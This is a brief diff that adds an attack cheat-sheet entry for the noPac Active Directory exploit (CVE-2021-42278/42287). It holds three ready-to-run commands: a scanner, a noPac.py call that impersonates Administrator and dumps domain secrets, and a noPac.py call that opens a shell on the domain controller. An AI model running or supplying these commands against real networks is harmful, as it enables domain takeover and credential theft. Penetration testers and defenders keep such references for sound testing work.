@@ -1,0 +1,4 @@
+# noPac — CVE-2021-42278/42287 (Sam-Account-Name spoofing)
+python3 scanner.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+python3 noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
+python3 noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -shell
